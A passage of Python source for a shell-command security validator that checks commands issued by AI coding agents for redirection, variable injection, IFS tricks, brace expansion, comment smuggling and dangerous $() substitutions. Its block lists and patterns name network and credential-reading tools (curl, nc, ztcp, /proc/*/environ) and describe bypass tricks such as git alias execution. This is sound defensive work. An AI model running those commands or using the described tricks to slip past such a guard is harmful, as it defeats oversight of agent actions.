        # fd duplication/close (>&2, 1>&2, <&0, >&-): no file is opened;
        # _shell_redirects above skips exactly these forms too.
        r"[0-9]*[<>]&(?:[0-9]+|-)",
        r"2\s*>\s*/dev/null",              # 2>/dev/null
        r">\s*/dev/null",                  # >/dev/null
        r">>?\s*/dev/std(?:out|err)\b",    # >/dev/stderr
        r"2\s*>>\s*[\w./-]+\.log",         # 2>>somefile.log
        r">>\s*[\w./-]+\.log",             # >>somefile.log (dev append)
        # > or >> targeting /tmp/...
        r">>?\s*/tmp/[\w./-]+",
        # > or >> targeting ./relative or relative paths (no leading /)
        # Path may contain dots and slashes but not start with /.
        r">>?\s*\./[\w./-]+",
        r">>?\s*[A-Za-z_][\w./-]*",
    ]
    cleaned = unquoted
    for pat in safe_patterns:
        cleaned = re.sub(pat, "", cleaned)

    if "<" in cleaned:
        return BashSecurityResult(
            safe=False, check_id=CheckID.INPUT_REDIRECTION,
            message="Command contains input redirection (<) which could read sensitive files",
        )
    if ">" in cleaned:
        return BashSecurityResult(
            safe=False, check_id=CheckID.OUTPUT_REDIRECTION,
            message="Command contains output redirection (>) which could write to arbitrary files",
        )
    return _SAFE


def _check_dangerous_variables(unquoted: str) -> BashSecurityResult:
    """Check 6: Variables used in redirect/pipe context.

    Threat model: ``cat $UNTRUSTED > /etc/passwd`` — an attacker-controlled
    variable spliced into a pipe or redirect can re-target the command at
    arbitrary files or pipelines. BUT the same regex matches benign loop
    bodies like ``for f in *.py; do echo $f | grep TODO; done`` which is
    common in dev work (task #2096).

    Loosen by allowlisting variables declared in a preceding ``for VAR in``
    statement within the same command string. The block stands for all
    other variable references in pipe/redirect contexts.
    """
    pipe_var_re = re.compile(r"[<>|]\s*\$\{?([A-Za-z_][A-Za-z0-9_]*)")
    var_pipe_re = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?\s*[|<>]")
    matches = list(pipe_var_re.finditer(unquoted)) + list(var_pipe_re.finditer(unquoted))
    if not matches:
        return _SAFE

    # Collect names declared as loop variables earlier in the command.
    loop_vars = {
        m.group(1)
        for m in re.finditer(r"\bfor\s+([A-Za-z_][A-Za-z0-9_]*)\s+in\b", unquoted)
    }

    for m in matches:
        var_name = m.group(1)
        if var_name in loop_vars:
            continue
        return BashSecurityResult(
            safe=False, check_id=CheckID.DANGEROUS_VARIABLES,
            message="Command contains variables in dangerous contexts (redirections or pipes)",
        )
    return _SAFE


def _check_newlines(command: str, unquoted: str) -> BashSecurityResult:
    """Check 7: Newlines that could separate multiple commands.

    Only fires when the newline is at a true shell-token boundary —
    i.e., OUTSIDE all quoted regions. Newlines embedded inside a quoted
    argument to a script interpreter (``python3 -c "import x\\nimport y"``,
    ``bash -c "set -e\\necho hi"``, ``psql -c "BEGIN;\\nSELECT 1;\\nCOMMIT;"``)
    are consumed by the interpreter, not the shell, so they are NOT command
    separators and must not trigger this check (the false-positive that
    blocked agents writing multi-line script bodies through ``-c``/``-e``).

    The quote state comes from the shared tokenizer (_scan_shell), so the
    decision is made on real shell semantics: a newline in any quoted
    token, a ``\\<NL>`` continuation or a heredoc body line is not a
    separator, while the newline ending a heredoc opener line is. Newlines
    inside a double-quoted ``"$(...)"`` are judged when check 8 runs that
    substitution's inner command through the full pipeline. (Comment
    smuggling via ``\\n#`` in quotes is check 23's job.)

    Carriage-return handling is preserved: ``\\r`` outside double quotes
    is blocked because it can cause parser differentials between
    shell-quote and bash.
    """
    if "\n" not in command and "\r" not in command:
        return _SAFE

    kinds = _scan_shell(command).kinds
    for i, ch in enumerate(command):
        if ch not in "\n\r":
            continue
        kind = kinds[i]
        if ch == "\r":
            if kind & _KIND_MASK == _K_DQ or kind & _F_HIDDEN:
                continue
            return BashSecurityResult(
                safe=False, check_id=CheckID.NEWLINES,
                message="Command contains carriage return which can cause parser differentials",
            )
        if kind & _KIND_MASK != _K_CODE or kind & _F_HIDDEN:
            continue  # quoted, escaped, heredoc text, or inside "$(...)"
        # Unquoted newline — true shell-token boundary. Block only when
        # followed by non-whitespace (i.e., a subsequent command on the
        # next line). A real ``\<NL>`` continuation never gets here (the
        # tokenizer marks that newline escaped); the backslash-then-blanks
        # allowance below is kept from the previous scanner.
        if not command[i + 1:].lstrip():
            continue
        j = i - 1
        while j >= 0 and command[j] in " \t":
            j -= 1
        is_continuation = (
            j >= 0
            and command[j] == "\\"
            and (j == 0 or command[j - 1] in (" ", "\t"))
        )
        if is_continuation:
            continue
        return BashSecurityResult(
            safe=False, check_id=CheckID.NEWLINES,
            message="Command contains newlines that could separate multiple commands",
        )

    return _SAFE


def _check_ifs_injection(command: str) -> BashSecurityResult:
    """Check 11: $IFS / ${...IFS...} usage."""
    if re.search(r"\$IFS|\$\{[^}]*IFS", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.IFS_INJECTION,
            message="Command contains IFS variable usage which could bypass security validation",
        )
    return _SAFE


def _check_proc_environ(command: str) -> BashSecurityResult:
    """Check 13: /proc/*/environ access."""
    if re.search(r"/proc/.*/environ", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.PROC_ENVIRON_ACCESS,
            message="Command accesses /proc/*/environ which could expose secrets",
        )
    return _SAFE


def _check_backslash_escaped_whitespace(command: str) -> BashSecurityResult:
    """Check 15: Backslash-space/tab outside quotes."""
    if _has_backslash_escaped_whitespace(command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.BACKSLASH_ESCAPED_WHITESPACE,
            message="Command contains backslash-escaped whitespace that could alter parsing",
        )
    return _SAFE


def _brace_expansions(text: str) -> list[tuple[int, int, str]]:
    """Return ``(open_pos, close_pos, kind)`` for every brace expansion in *text*.

    A brace expansion is a matched, unescaped ``{...}`` whose top level holds
    a ``,`` (kind ``"comma"``: ``{a,b}``) or ``..`` (kind ``"sequence"``:
    ``{1..5}``). Unmatched braces are ignored. Results are sorted by
    ``open_pos``.

    Single linear pass with a stack (sandbox-07): the previous version walked
    forward from every ``{`` to find its partner and backwards over
    backslashes at every position, so 40k ``{`` took minutes.
    """
    escaped = _escaped_positions(text)
    open_stack: list[list] = []  # [open_pos, kind or None]
    found: list[tuple[int, int, str]] = []
    length = len(text)
    for index, ch in enumerate(text):
        if ch == "{" and not escaped[index]:
            open_stack.append([index, None])
        elif ch == "}" and not escaped[index]:
            if open_stack:
                open_pos, kind = open_stack.pop()
                if kind is not None:
                    found.append((open_pos, index, kind))
        elif open_stack and open_stack[-1][1] is None:
            # A separator belongs to the innermost open brace, i.e. the pair
            # for which it sits at depth 0.
            if ch == ",":
                open_stack[-1][1] = "comma"
            elif ch == "." and index + 1 < length and text[index + 1] == ".":
                open_stack[-1][1] = "sequence"
    found.sort()
    return found


_BRACE_COMMA_MESSAGE = "Command contains brace expansion that could alter parsing"
_BRACE_SEQUENCE_MESSAGE = "Command contains brace sequence expansion ({a..z})"

# Commands whose ARGUMENTS may carry a brace list (`ls {a,b}`,
# `cp f{,.bak}`): none of them runs an argument as a command or as code.
_BRACE_EXPANSION_SAFE_BASES: frozenset[str] = frozenset([
    "echo", "printf", "ls", "cat", "cp", "mv", "mkdir", "touch", "diff",
    "wc", "head", "tail", "grep", "egrep", "fgrep", "rg", "stat", "du",
    "file", "sort", "uniq",
])
# A brace word containing any of these could turn into something else after
# quote removal or expansion (`"-"{a,b}` becomes `-a -b`).
_BRACE_WORD_FORBIDDEN_CHARS = frozenset("'\"\\$`")
_WORD_WHITESPACE = frozenset(" \t\n")


def _brace_segment_problem(segment: str) -> str | None:
    """Return a check-16 message if *segment* uses brace expansion unsafely.

    Allowed (sandbox-13): a comma list such as ``{a,b}`` in an ARGUMENT of a
    command from ``_BRACE_EXPANSION_SAFE_BASES``, provided that

    * the command word itself holds no brace (``{rm,-rf,x}`` builds a
      command),
    * the word does not start with ``-`` and a list at the start of a word
      has no element starting with ``-`` (``ls {-la,/}`` builds flags),
    * the word holds no quote, backslash, ``$`` or backtick, and
    * there is at most one list per word and no nesting, which keeps the
      expansion linear in the command length (``{a,b}{a,b}...`` doubles
      with every group).

    Sequence expressions (``{1..99999999}``) stay blocked: their size is
    unbounded. The scan runs on the quote-delimiter-preserving view, so
    quoted commas do not count and quoted text shows up as a quote mark.
    """
    view = _extract_unquoted_keep_delimiters(segment)
    expansions = _brace_expansions(view)
    if not expansions:
        return None
    if any(kind == "sequence" for _, _, kind in expansions):
        return _BRACE_SEQUENCE_MESSAGE
    base = _get_base_command(view)
    if "{" in base or base.rsplit("/", 1)[-1] not in _BRACE_EXPANSION_SAFE_BASES:
        return _BRACE_COMMA_MESSAGE

    previous_word_end = -1
    for open_pos, close_pos, _ in expansions:
        if open_pos < previous_word_end:
            return _BRACE_COMMA_MESSAGE  # second or nested list in one word
        word_start = open_pos
        while word_start > 0 and view[word_start - 1] not in _WORD_WHITESPACE:
            word_start -= 1
        word_end = close_pos + 1
        while word_end < len(view) and view[word_end] not in _WORD_WHITESPACE:
            word_end += 1
        word = view[word_start:word_end]
        if word.startswith("-") or any(
            ch in _BRACE_WORD_FORBIDDEN_CHARS for ch in word
        ):
            return _BRACE_COMMA_MESSAGE
        if open_pos == word_start and any(
            element.startswith("-")
            for element in view[open_pos + 1:close_pos].split(",")
        ):
            return _BRACE_COMMA_MESSAGE
        previous_word_end = word_end
    return None


def _check_brace_expansion(command: str, unquoted: str) -> BashSecurityResult:
    """Check 16: Brace expansion ({a,b} or {1..5}) in unquoted content."""
    # Count unescaped braces (linear: escape state is precomputed).
    escaped = _escaped_positions(unquoted)
    open_count = 0
    close_count = 0
    for index, ch in enumerate(unquoted):
        if ch == "{" and not escaped[index]:
            open_count += 1
        elif ch == "}" and not escaped[index]:
            close_count += 1

    # Excess closing braces = quoted braces were stripped (attack primitive)
    if open_count > 0 and close_count > open_count:
        return BashSecurityResult(
            safe=False, check_id=CheckID.BRACE_EXPANSION,
            message="Excess closing braces after quote stripping (brace expansion obfuscation)",
        )

    # Quoted brace inside unquoted brace context
    if open_count > 0 and re.search(r"""['"][{}]['"]""", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.BRACE_EXPANSION,
            message="Quoted brace character inside brace context (potential obfuscation)",
        )

    # Early out: expansions seen in the per-segment quote-preserving view
    # are a subset of those in the unquoted view.
    if open_count == 0 or not _brace_expansions(unquoted):
        return _SAFE
    for segment in _split_command_segments(command):
        message = _brace_segment_problem(segment)
        if message is not None:
            return BashSecurityResult(
                safe=False, check_id=CheckID.BRACE_EXPANSION, message=message,
            )
    return _SAFE


def _check_unicode_whitespace(command: str) -> BashSecurityResult:
    """Check 18: Unicode whitespace characters."""
    if _UNICODE_WS_RE.search(command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.UNICODE_WHITESPACE,
            message="Command contains Unicode whitespace that could cause parsing inconsistencies",
        )
    return _SAFE


def _check_heredoc_in_substitution(command: str) -> BashSecurityResult:
    """Check 19: Heredoc inside command substitution ($(...<<...)).

    The canonical Claude Code multi-line commit pattern
    ``$(cat <<'DELIM' ... DELIM)`` is permitted because the single-quoted
    (or backslash-escaped) heredoc delimiter suppresses ALL parameter and
    command expansion inside the body — ``cat`` only emits literal text.
    Unquoted ``<<EOF`` is still blocked because expansions happen there.
    """
    if not re.search(r"\$\(.*<<", command, re.DOTALL):
        return _SAFE

    # Whitelist: if EVERY top-level $(...) substitution body is a single
    # benign `cat <<'DELIM' ... DELIM` (with matching backreferenced
    # delimiter), the command is safe. Reuses the same helper as check 12
    # to keep parsing semantics consistent across both checks.
    inners = _extract_dollar_paren_inners(command)
    if inners and all(_is_benign_cat_heredoc_inner(inner) for inner in inners):
        return _SAFE

    return BashSecurityResult(
        safe=False, check_id=CheckID.HEREDOC_IN_SUBSTITUTION,
        message="Command contains heredoc inside command substitution",
    )


def _is_find_exec_escaped_semicolon(command: str) -> bool:
    """Return True when all backslash-escaped operators are ``\\;`` in a
    ``find -exec`` / ``find -execdir`` context.

    After stripping every ``\\;`` occurrence, there should be no remaining
    backslash-escaped operators for this to be considered safe.
    """
    if not re.search(r"\bfind\b", command):
        return False
    if not re.search(r"-exec(?:dir)?\b", command):
        return False
    # Strip all \; and re-check — any remaining \op is still dangerous
    stripped = command.replace("\\;", "")
    return not _has_backslash_escaped_operator(stripped)


def _check_backslash_escaped_operators(command: str) -> BashSecurityResult:
    r"""Check 21: ``\;``, ``\|``, ``\&``, ``\<``, ``\>`` outside quotes.

    Exception: ``\;`` is allowed in ``find -exec`` / ``find -execdir``
    context, where it is the standard command terminator.
    """
    if not _has_backslash_escaped_operator(command):
        return _SAFE

    # Allow \; in find -exec context (standard POSIX find syntax)
    if _is_find_exec_escaped_semicolon(command):
        return _SAFE

    return BashSecurityResult(
        safe=False, check_id=CheckID.BACKSLASH_ESCAPED_OPERATORS,
        message="Command contains backslash before shell operator which can hide command structure",
    )


def _check_control_characters(command: str) -> BashSecurityResult:
    """Check 17: ASCII control characters (excluding common whitespace)."""
    # Allow tab (0x09), newline (0x0a), carriage return (0x0d)
    for ch in command:
        code = ord(ch)
        if code < 0x20 and code not in (0x09, 0x0A, 0x0D):
            return BashSecurityResult(
                safe=False, check_id=CheckID.CONTROL_CHARACTERS,
                message=f"Command contains ASCII control character (0x{code:02x})",
            )
        if code == 0x7F:  # DEL
            return BashSecurityResult(
                safe=False, check_id=CheckID.CONTROL_CHARACTERS,
                message="Command contains DEL control character (0x7f)",
            )
    return _SAFE


# Interpreters whose -c / -e argument is a script body — never re-parsed by
# the shell, so a literal '#' inside the quoted body is the language's own
# comment character (Python/Perl/Ruby/JS), not a shell-comment smuggling
# primitive. Note: bash/sh/zsh are intentionally EXCLUDED — for those, the
# quoted body IS shell input and '# evil' really can hide arguments.
#
# The optional path prefix ``(?:[^\s]*/)?`` allows virtualenv / path-qualified
# forms like ``./venv/bin/python``, ``venv/bin/python3``, ``/usr/bin/python3``
# that agents commonly use when activating a project virtualenv. The ``#``
# inside such a ``-c`` body is the Python comment character — not a shell
# comment smuggling primitive — so the check-23 block is a false positive
# (bug 2603, tasks #2596 x2 / #2601 / #2602).
_SAFE_SCRIPT_INTERPRETER_BEFORE_QUOTE_RE = re.compile(
    r"(?:^|[\s;&|`(])"
    r"(?:[^\s]*/)?"
    r"(?:python|python2|python3|py|perl|ruby|node|nodejs)"
    r"\s+-(?:c|e)\s*$"
)


def _is_inside_safe_interpreter_arg(command: str, quote_open_idx: int) -> bool:
    """Return True if the quote at ``quote_open_idx`` opens the script-body
    argument of a known-safe script interpreter (``python -c``, ``perl -e``,
    etc.). The prefix may include arbitrary command wrappers like
    ``timeout 30``, ``env FOO=bar``, ``nohup``, or chained commands —
    anything as long as the immediate token-pair before the quote is
    ``<interpreter> -c`` / ``<interpreter> -e``.
    """
    if quote_open_idx <= 0:
        return False
    prefix = command[:quote_open_idx]
    return bool(_SAFE_SCRIPT_INTERPRETER_BEFORE_QUOTE_RE.search(prefix))


# CLI tools whose markdown-body flag (``--body``/``-b``/``--message``/``-m``)
# legitimately carries multi-line markdown including ``# Header`` lines. The
# body is passed as a single quoted token, so ``#`` cannot hide an argument.
# Pattern matches the immediate token-pair before the quote: ``<tool> ...
# <flag>``. The ``...`` allows other intervening flags like ``--title "X"``
# but the flag must be the last token before the quote.
_MARKDOWN_BODY_FLAG_BEFORE_QUOTE_RE = re.compile(
    r"(?:^|[\s;&|`(])"
    r"(?:gh|git|hub)\b"
    r"[^|;&`(]*?"
    r"\s(?:--body|-b|--message|-m)\s*$"
)


_MARKDOWN_BODY_TOOLS: frozenset[str] = frozenset({"gh", "git", "hub"})
_MARKDOWN_BODY_FLAGS: frozenset[str] = frozenset(
    {"--body", "-b", "--message", "-m"}
)


def _last_segment_start(prefix: str) -> int:
    """Return the index in ``prefix`` where the current shell command segment
    begins. Splits on ``;``, ``&&``, ``||``, ``|``, ``&``, ``(``, and
    backticks at unquoted positions only — quoted arguments containing
    these characters do NOT split the segment.
    """
    in_single = False
    in_double = False
    escaped = False
    last_break = 0
    i = 0
    n = len(prefix)
    while i < n:
        ch = prefix[i]
        if escaped:
            escaped = False
            i += 1
            continue
        if ch == "\\" and not in_single:
            escaped = True
            i += 1
            continue
        if ch == "'" and not in_double:
            in_single = not in_single
            i += 1
            continue
        if ch == '"' and not in_single:
            in_double = not in_double
            i += 1
            continue
        if not in_single and not in_double:
            if ch in (";", "(", "`"):
                last_break = i + 1
            elif ch == "|":
                if i + 1 < n and prefix[i + 1] == "|":
                    last_break = i + 2
                    i += 2
                    continue
                last_break = i + 1
            elif ch == "&":
                if i + 1 < n and prefix[i + 1] == "&":
                    last_break = i + 2
                    i += 2
                    continue
                last_break = i + 1
        i += 1
    return last_break


def _is_inside_markdown_body_arg(command: str, quote_open_idx: int) -> bool:
    """Return True if the quote at ``quote_open_idx`` opens the body of a
    markdown-accepting CLI flag (``gh pr create --body "..."``,
    ``git commit -m "..."``, etc.). Inside such a body, ``\\n#`` is a
    markdown header, not shell-comment smuggling — the body is one token to
    the tool.

    Two-stage check:

    1. Fast regex (``_MARKDOWN_BODY_FLAG_BEFORE_QUOTE_RE``) for the common
       case where the prefix has no quoted arguments containing parens.
    2. Token-aware fallback (``shlex``) for prefixes whose quoted arguments
       contain ``(`` / ``)`` — e.g. PR titles like ``feat(drivers): X (DR-01)``
       which the regex's ``[^|;&`(]*?`` body cannot span. This was the
       second false-positive observed (TheForge bug 2320) after the
       original gh/git allowlist (bug 2238).
    """
    if quote_open_idx <= 0:
        return False
    prefix = command[:quote_open_idx]
    if _MARKDOWN_BODY_FLAG_BEFORE_QUOTE_RE.search(prefix):
        return True

    # Token-aware fallback. Restrict to the current command segment so
    # ``rm -rf / && gh ... --body "..."`` is still caught upstream by the
    # rm check, and a leading non-gh command does not mask the gh head.
    seg_start = _last_segment_start(prefix)
    segment = prefix[seg_start:].strip()
    if not segment:
        return False
    try:
        tokens = shlex.split(segment, posix=True)
    except ValueError:
        # Unbalanced quoting — cannot reason about token boundaries safely.
        return False
    if len(tokens) < 2:
        return False
    if tokens[-1] not in _MARKDOWN_BODY_FLAGS:
        return False
    return tokens[0] in _MARKDOWN_BODY_TOOLS


def _check_quoted_newline_comment(command: str) -> BashSecurityResult:
    """Check 23: Newline inside quotes where next line starts with #.

    Threat model: ``bash -c "real_cmd\\n# malicious_arg"`` — the ``#`` makes
    bash skip the rest of the line, hiding payload bytes from path
    validation. BUT ``python3 -c "import x\\n# comment\\nprint(x)"`` is the
    standard Python comment syntax; agents writing Python heredocs hit this
    constantly (tasks #2075, #2077, #2096).

    Loosen by allowlisting:
    - The ``-c``/``-e`` argument of script interpreters whose body is NOT
      re-parsed by the shell: python, perl, ruby, node.
    - The markdown-body argument of CLI tools that accept multi-line
      markdown payloads (``gh``/``git``/``hub`` with ``--body``/``-b``/
      ``--message``/``-m``). Markdown headers (``# Heading``) on a fresh
      line inside the body would otherwise trip this check and kill PR
      creation despite the agent having completed all code work — see
      TheForge bug 2238. The body is a single quoted token to the tool, so
      ``#`` cannot smuggle an argument.

    The check still fires for shells (``bash -c``, ``sh -c``, ``zsh -c``)
    where ``#`` is the comment-smuggling primitive this check was designed
    to catch, and for any other context where a quoted ``\\n# ...`` could
    hide arguments.
    """
    if "\n" not in command or "#" not in command:
        return _SAFE

    in_single = False
    in_double = False
    escaped = False
    quote_open_idx = -1

    for i, ch in enumerate(command):
        if escaped:
            escaped = False
            continue
        if ch == "\\" and not in_single:
            escaped = True
            continue
        if ch == "'" and not in_double:
            if not in_single:
                quote_open_idx = i
            in_single = not in_single
            continue
        if ch == '"' and not in_single:
            if not in_double:
                quote_open_idx = i
            in_double = not in_double
            continue

        # Inside quotes and hit a newline — check if next line starts with #
        if (in_single or in_double) and ch == "\n":
            rest = command[i + 1:]
            if rest.lstrip().startswith("#"):
                if _is_inside_safe_interpreter_arg(command, quote_open_idx):
                    continue
                if _is_inside_markdown_body_arg(command, quote_open_idx):
                    continue
                return BashSecurityResult(
                    safe=False, check_id=CheckID.QUOTED_NEWLINE,
                    message="Quoted newline followed by # comment can hide arguments from validation",
                )
    return _SAFE


# ---------------------------------------------------------------------------
# Zsh dangerous commands (from ZSH_DANGEROUS_COMMANDS in bashSecurity.ts)
# ---------------------------------------------------------------------------

_ZSH_DANGEROUS_COMMANDS: frozenset[str] = frozenset([
    "zmodload",   # Gateway to dangerous module-based attacks
    "emulate",    # With -c flag is an eval-equivalent
    "sysopen",    # Opens files with fine-grained control (zsh/system)
    "sysread",    # Reads from file descriptors (zsh/system)
    "syswrite",   # Writes to file descriptors (zsh/system)
    "sysseek",    # Seeks on file descriptors (zsh/system)
    "zpty",       # Executes commands on pseudo-terminals (zsh/zpty)
    "ztcp",       # Creates TCP connections for exfiltration (zsh/net/tcp)
    "zsocket",    # Creates Unix/TCP sockets (zsh/net/socket)
    "mapfile",    # Associative array set via zmodload
    "zf_rm",      # Builtin rm from zsh/files
    "zf_mv",      # Builtin mv from zsh/files
    "zf_ln",      # Builtin ln from zsh/files
    "zf_chmod",   # Builtin chmod from zsh/files
    "zf_chown",   # Builtin chown from zsh/files
    "zf_mkdir",   # Builtin mkdir from zsh/files
    "zf_rmdir",   # Builtin rmdir from zsh/files
    "zf_chgrp",   # Builtin chgrp from zsh/files
])

_ZSH_PRECOMMAND_MODIFIERS: frozenset[str] = frozenset([
    "command", "builtin", "noglob", "nocorrect",
])

# Read-only text tools where locale quoting ($"...") is a legitimate i18n
# pattern, not an attack vector. Allowlist used by Check 4.
#
# Also includes version-control / PR-creation commands (git/gh/hg/jj/svn)
# where $"..." inside arguments is committed AS DATA into a commit message,
# PR body, or changelog — it never reaches an exec context. The check-4
# threat model (locale quoting as a vector to hide characters from exec)
# does not apply here. See bug 2310.
_LOCALE_QUOTING_SAFE_BASES: frozenset[str] = frozenset([
    "grep", "egrep", "fgrep", "rg", "ag", "ack",
    "sed", "awk", "gawk",
    "find", "fd",
    "echo", "printf",
    "git", "gh", "hg", "jj", "svn",
])

# Read-only commands safe to appear inside $() command substitution.
# Used by Check 8. Anything not in this list keeps $() blocked.
#
# Both the assignment-side ``var=$(cmd)`` and the argument-side
# ``other_cmd $(cmd)`` forms route through the same allowlist
# (task #2308 — argument-side false-positives blocked common dev
# patterns like ``ls $(go env GOMODCACHE)`` and ``gh pr create
# --body-file $(mktemp -d)/body.md``).
# SR-2722 S1/S2: this set MUST contain ONLY pure value-emitters and
# read-only filters that can NEITHER execute another command NOR write/delete
# files. General-purpose interpreters/runners (sed, awk, find, fd, env,
# command, tee, gh) were REMOVED — each is an RCE or arbitrary-file-write
# vector inside $() (awk system(), sed `e`/`-i`/`w`, find `-exec`/`-delete`,
# env/command run their argument, tee writes any path). `git` and `go` stay
# but are gated by _git_substitution_is_read_only() / _go_substitution_is_read_only()
# in _is_safe_substitution_inner — raw membership here is NOT sufficient for them.
_SAFE_SUBSTITUTION_COMMANDS: frozenset[str] = frozenset([
    "git",          # gated: read-only subcommands only (see helper)
    "go",           # gated: `go env`/`go version`/`go list` only (see helper)
    "date",
    "basename", "dirname", "realpath", "readlink",
    "mktemp",       # path emitter; output is a fresh tmp path/dir
    "pwd",
    "echo", "printf",
    "cat",          # pure filter; cannot write (no redirection operator here)
    "wc", "head", "tail", "sort", "uniq",
    "grep", "egrep", "fgrep", "rg", "ag",
    "tr", "cut",    # pure text filters
    "ls",
    "id", "whoami", "hostname", "uname",
    "which", "type",
    "expr", "test", "[",   # `[` is the test builtin: `[ -x path ]`
    "true", "false",       # no-op status commands, common chain fallbacks
])

# Commands that MUST NEVER appear inside $() — these are the dangerous side
# effecting commands that the original Check 8 was designed to block.
_DANGEROUS_SUBSTITUTION_COMMANDS: frozenset[str] = frozenset([
    "rm", "mv", "cp", "dd", "shred",
    "chmod", "chown", "chgrp",
    "curl", "wget", "ssh", "scp", "rsync", "ftp", "nc", "ncat", "telnet",
    "sudo", "su", "doas",
    "eval", "exec", "source", ".",
    "bash", "sh", "zsh", "ksh", "dash", "fish",
    "python", "python3", "perl", "ruby", "node", "deno", "php",
    "kill", "killall", "pkill",
    "mount", "umount",
    "iptables", "nft",
    "systemctl", "service",
    "apt", "apt-get", "yum", "dnf", "pip", "pip3", "npm", "yarn",
    "docker", "podman", "kubectl",
])


# Read-only git subcommands allowed inside $() (SR-2722 S1). A subcommand not
# in this set — or any global RCE-bearing option (`-c`, `--exec-path`,
# `--config-env`, `core.pager`, `alias.`, `!`) — makes the whole git segment
# unsafe.
_GIT_READONLY_SUBCOMMANDS: frozenset[str] = frozenset([
    "rev-parse", "rev-list", "log", "diff", "branch", "describe",
    "status", "show", "config", "symbolic-ref", "name-rev",
    "merge-base", "cat-file", "ls-files", "ls-tree", "tag", "remote",
])

# `git remote <verb>` verbs that MUTATE state — bare `git remote`/`git remote -v`
# is read-only, but these are not.
_GIT_REMOTE_MUTATING: frozenset[str] = frozenset([
    "add", "remove", "rm", "rename", "set-url", "set-head",
    "set-branches", "prune", "update",
])


def _git_substitution_is_read_only(segment: str) -> bool:
    """SR-2722 S1: allow ``git`` inside ``$()`` ONLY for read-only, non-RCE use.

    ``git`` is a general-purpose runner: ``git -c alias.x='!cmd' x`` and
    ``git -c core.pager='cmd' log`` execute arbitrary commands, and
    ``--exec-path``/``--config-env`` relocate the executed program set. This
    helper permits git in a substitution only when:

    * the command carries NONE of ``-c`` / ``--exec-path`` / ``--config-env``
      and no argument contains ``core.pager`` / ``alias.`` / ``!``; AND
    * the first non-flag token is a known read-only subcommand
      (``rev-parse``, ``log``, ``diff``, ...); AND
    * ``config`` is limited to ``--get*``/``--list`` (never a write); and
      ``remote`` carries no mutating verb.

    Returns False (unsafe) on anything it cannot positively prove read-only.
    """
    try:
        tokens = shlex.split(segment)
    except ValueError:
        return False
    if not tokens or tokens[0] != "git":
        return False
    rest = tokens[1:]

    # Global RCE-bearing options anywhere in the command -> reject outright.
    for tok in rest:
        if tok.startswith("-c"):            # -c, -c=, -cKEY=VAL (config inject)
            return False
        if tok.startswith("--exec-path"):   # relocate git's exec dir
            return False
        if tok.startswith("--config-env"):  # -c via env indirection
            return False
        if "core.pager" in tok or "alias." in tok or "!" in tok:
            return False

    # First non-flag token = the subcommand.
    subcommand = None
    sub_idx = -1
    for idx, tok in enumerate(rest):
        if tok.startswith("-"):
            continue
        subcommand = tok
        sub_idx = idx
        break
    if subcommand is None or subcommand not in _GIT_READONLY_SUBCOMMANDS:
        return False

    sub_args = rest[sub_idx + 1:]
    if subcommand == "config":
        # Read-only config access only: must ask for a value, never set one.
        if not any(a == "--list" or a.startswith("--get") for a in sub_args):
            return False
        return True
    if subcommand == "remote":
        for a in sub_args:
            if not a.startswith("-") and a in _GIT_REMOTE_MUTATING:
                return False
        return True
    return True


# Read-only go subcommands allowed inside $() (SR-2722, task 2722 FP follow-up).
# `go env`/`go version`/`go list` are pure value-emitters used by EQUIPA's Go
# builds (docs/BASHSECURITY-WORKAROUNDS.md). Everything that compiles or runs
# code (`go run`, `go build`, `go test`, `go generate`, `go install`, `go get`,
# `go vet`, `go tool`, `go work`, `go mod ...`) stays blocked, as does the
# `go env -w`/`-u` write form which MUTATES the persisted go environment.
_GO_READONLY_SUBCOMMANDS: frozenset[str] = frozenset([
    "env", "version", "list",
])


def _go_substitution_is_read_only(segment: str) -> bool:
    """SR-2722: allow ``go`` inside ``$()`` ONLY for pure value-emitters.

    Permits ``go env [VAR]``, ``go version`` and ``go list ...`` (all read-only
    stdout emitters). Rejects every compile/execute subcommand and the
    ``go env -w``/``go env -u`` write forms that mutate persisted go env.
    Returns False on anything it cannot positively prove read-only.
    """
    try:
        tokens = shlex.split(segment)
    except ValueError:
        return False
    if not tokens or tokens[0] != "go":
        return False
    rest = tokens[1:]

    # Defense-in-depth: no nested substitution smuggled into a token.
    for tok in rest:
        if "`" in tok or "$(" in tok:
            return False

    # First non-flag token = the subcommand.
    subcommand = None
    sub_idx = -1
    for idx, tok in enumerate(rest):
        if tok.startswith("-"):
            continue
        subcommand = tok
        sub_idx = idx
        break
    if subcommand is None or subcommand not in _GO_READONLY_SUBCOMMANDS:
        return False

    sub_args = rest[sub_idx + 1:]
    if subcommand == "env":
        # `go env -w KEY=VAL` / `go env -u KEY` MUTATE the persisted go env.
        for a in sub_args:
            if a in ("-w", "-u") or a.startswith("-w") or a.startswith("-u"):
                return False
        return True
    return True


# ---------------------------------------------------------------------------
# Additional checks (ported from bashSecurity.ts)
# ---------------------------------------------------------------------------

def _check_shell_metacharacters(command: str, unquoted: str) -> BashSecurityResult:
    """Check 5: Shell metacharacters (;, |, &) inside quoted find/grep args.

    Detects metacharacters smuggled inside quoted arguments to find-style
    commands (e.g., ``find . -name "foo;evil"``).

    NOTE: These patterns must match against the ORIGINAL command (not the
    unquoted version) because the metacharacters are *inside* quotes — the
    unquoted extractor would strip them.

    Only targets find-style flags (``-name``, ``-path``, ``-iname``,
    ``-regex``).  Semicolons inside quoted arguments to interpreters
    (``python -c "import X; print(...)"``) are legitimate code separators
    and are NOT flagged.
    """
    # Find-specific patterns: -name, -path, -iname, -regex with metacharacters
    for pattern in (
        r'''-name\s+["'][^"']*[;|&][^"']*["']''',
        r'''-path\s+["'][^"']*[;|&][^"']*["']''',
        r'''-iname\s+["'][^"']*[;|&][^"']*["']''',
        r'''-regex\s+["'][^"']*[;&][^"']*["']''',
    ):
        if re.search(pattern, command):
            return BashSecurityResult(
                safe=False, check_id=CheckID.SHELL_METACHARACTERS,
                message="Command contains shell metacharacters in find arguments",
            )
    return _SAFE


def _check_mid_word_hash(command: str) -> BashSecurityResult:
    """Check 19 (alt): Mid-word # causes parser differential.

    shell-quote treats mid-word ``#`` as comment-start, but bash treats
    it as a literal character. Detect ``\\S#`` outside ``${#`` patterns.

    Uses ``_extract_unquoted_keep_delimiters`` (matching the TS
    ``unquotedKeepQuoteChars``) so that ``'x'#`` is preserved as
